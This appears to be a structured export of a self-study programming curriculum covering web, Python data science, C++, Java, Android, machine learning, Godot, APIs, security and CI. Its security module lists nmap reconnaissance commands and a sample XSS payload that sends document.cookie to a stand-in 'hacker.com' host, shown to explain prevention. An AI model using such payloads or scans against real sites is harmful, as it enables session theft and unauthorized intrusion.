description: The foundation of the modern web. Focus on responsive design, DOM manipulation, and browser-based persistence.

topics.text: Grid is the most powerful layout system available in CSS. It is 2-dimensional, meaning it can handle both columns and rows. Use 'auto-fit' and 'minmax' to create truly responsive grids that don't even need media queries.
When talking to APIs (like your JSONBin or Weather API), you must handle the delay. Use 'async/await' for cleaner code that reads like synchronous logic but performs non-blocking operations.
Instead of adding an event listener to 100 different buttons, add ONE listener to their parent container. This is called Event Delegation and it is much more memory efficient.

description: Moving from syntax to data manipulation. Mastering the 'Big Three' libraries: Pandas, NumPy, and Matplotlib.

topics.text: A DataFrame is essentially an Excel spreadsheet inside Python. You can filter, sort, and clean millions of rows of data with single commands.
topics.codeSnippet:
import pandas as pd

df = pd.read_csv('data.csv')

# Cleaning: Fill missing values with the mean
df['age'] = df['age'].fillna(df['age'].mean())

# Filtering: Only rows where score > 80
high_scores = df[df['score'] > 80]

print(high_scores.describe())

topics.text: For your Statistical Dashboard, NumPy is the engine. It performs complex math on entire arrays (vectors) much faster than standard Python loops.
topics.codeSnippet:
import numpy as np

data = [10, 20, 30, 40, 50]

mean = np.mean(data)
std_dev = np.std(data)
variance = np.var(data)

# Skewness requires the scipy library
from scipy.stats import skew
print(f"Skewness: {skew(data)}")

topics.text: Always isolate your projects. Different projects may require different versions of libraries. Use venv to keep your global Python installation clean.
topics.codeSnippet:
# Create environment
python -m venv venv

# Activate (Windows)
.\venv\Scripts\activate

# Install requirements
pip install pandas matplotlib seaborn

description: Low-level power. Understanding memory, pointers, and the compilation process for performance-critical apps.

topics.text: A pointer stores the memory address of a value. A reference is an alias for an existing variable. Understanding this is key to building the Freserve game engine without crashing the computer.
topics.codeSnippet:
int health = 100;
int* ptr = &health; // Pointer to address
int& ref = health; // Reference to variable

*ptr = 80; // Changing value via pointer
std::cout << health; // Outputs 80

topics.text: In C++, we separate the 'blueprint' (Header .h) from the 'execution' (Source .cpp). This speeds up compilation time for large projects.
Don't reinvent the wheel. Use 'std::vector' for dynamic arrays, 'std::map' for key-value pairs, and 'std::stack' for undo/redo logic.

description: Strict Object-Oriented Programming. Mastering inheritance, polymorphism, and enterprise-grade design patterns.

topics.text: This is the 'is-a' relationship. A Warrior 'is-a' Character. Polymorphism allows you to treat a list of different objects (Warriors, Mages) as a single list of Characters and call their specific methods.
Abstract classes define what a thing IS (base identity). Interfaces define what a thing can DO (behavior). A class can only inherit one abstract class, but it can implement many interfaces.
Don't let your app crash. Use try-catch blocks to handle input errors or file loading issues gracefully. Use 'finally' to close database connections.

description: Building native applications with Java and the Android SDK. Mastering life-cycles and hardware permissions.

topics.text: Android apps don't just 'run'—they transition through states. If you don't handle 'onPause' or 'onSaveInstanceState', your app will lose data whenever the user rotates their phone.
Don't use raw HttpUrlConnection. Retrofit turns your HTTP API into a Java Interface, making network calls as simple as calling a local method.

description: Teaching computers to recognize patterns using Python. From Linear Regression to Deep Learning.

topics.text: 1. Scrape/Collect Data -> 2. Clean (Pandas) -> 3. Split (Train/Test) -> 4. Train Model -> 5. Evaluate (Accuracy/F1 Score).
topics.codeSnippet:
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier

X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)

model = RandomForestClassifier()
model.fit(X_train, y_train)

print(f"Model Accuracy: {model.score(X_test, y_test)}")

topics.text: For complex tasks like image recognition in Bandi v2, we use layers of 'neurons'. A Convolutional Neural Network (CNN) is best for spatial data (images).
topics.codeSnippet:
model = Sequential([
    Conv2D(32, (3,3), activation='relu', input_shape=(64, 64, 3)),
    MaxPooling2D(2,2),
    Flatten(),
    Dense(128, activation='relu'),
    Dense(1, activation='sigmoid') # Binary Output
])

description: Scene-based game architecture using GDScript. Logic meets physics and visuals.

topics.text: In Godot, everything is a Node. A 'Player' scene might consist of a CharacterBody2D (physics), a Sprite2D (visual), and a CollisionShape2D (hitbox).
Avoid 'Spaghetti Code'. Instead of the Player telling the UI to update, the Player 'emits' a signal, and the UI 'listens' for it.
topics.codeSnippet:
# Player.gd
signal health_depleted

func die():
    emit_signal("health_depleted")

# UI.gd
func _ready():
    player.connect("health_depleted", _on_player_death)

description: The 'Glue' of the ecosystem. Building secure APIs that connect Web, Mobile, and Games.

topics.text: JSON Web Tokens allow for stateless authentication. The server signs a token and the client sends it back in the 'Authorization' header for every request.
By default, your Node.js API will block requests from your GitHub Pages site. You must explicitly allow your domain in the Express middleware.

description: Learning to identify and patch vulnerabilities. Shifting the mindset from 'How do I build it?' to 'How can this be broken?'

topics.text: The most common attack on databases. Never concatenate user input directly into SQL strings. Always use Parameterized Queries or an ORM like Mongoose/Sequelize.
Before an attack, a hacker maps the network. Nmap is the industry standard for discovering open ports and identifying the services (and versions) running on a server.
topics.codeSnippet:
# Basic Service Version Scan
nmap -sV 192.168.1.1

# Aggressive Scan (OS Detection + Scripts)
nmap -A target.com

# Scanning for common web vulnerabilities
nmap --script http-enum target.com

topics.text: XSS occurs when an application includes untrusted data in a web page without proper validation. Use 'DOMPurify' on the frontend and 'Helmet.js' on the backend to sanitize everything.
topics.codeSnippet:
<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>

// Prevention in Node.js
const helmet = require('helmet');
app.use(helmet());

description: The culmination of 2.5 years. Building a synchronized, multi-platform system that utilizes every skill in the marathon.

topics.text: In a massive ecosystem, don't build a 'Monolith'. Separate your ML logic (FastAPI), your user management (Node.js), and your game assets (Godot) so they can scale independently.
Automation is the final boss. Set up a workflow so that every time you push code to GitHub, your tests run automatically, and your site redeploys only if the tests pass.
topics.codeSnippet:
name: Node.js CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install dependencies
        run: npm install
      - name: Run Tests
        run: npm test
